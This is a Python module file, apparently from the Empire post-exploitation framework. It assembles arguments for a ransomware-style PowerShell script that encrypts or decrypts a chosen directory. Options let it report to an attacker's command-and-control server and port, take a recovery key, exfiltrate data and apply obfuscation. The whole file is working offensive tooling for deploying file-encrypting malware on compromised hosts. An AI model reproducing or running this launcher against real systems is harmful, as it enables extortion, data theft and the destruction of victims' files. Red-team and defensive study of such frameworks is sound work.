from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        if params["Mode"] == "Encrypt":
            args = f'$args = @(\'-e\', \'{params["Directory"]}\''
        elif params["Mode"] == "Decrypt":
            args = f'$args = @(\'-d\', \'{params["Directory"]}\''

        if params["C2Server"] != "" and params["C2Port"] != "":
            args += (
                f', \'-s\', \'{params["C2Server"]}\', \'-p\', \'{params["C2Port"]}\''
            )

        if params["RecoveryKey"] != "":
            args += f', \'-k\', \'{params["RecoveryKey"]}\''

        if params["Exfiltrate"] == "True":
            args += ", '-x'"

        if params["Demo"] == "True":
            args += ", '-demo'"

        args += ")\n"
        script = args + script
        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
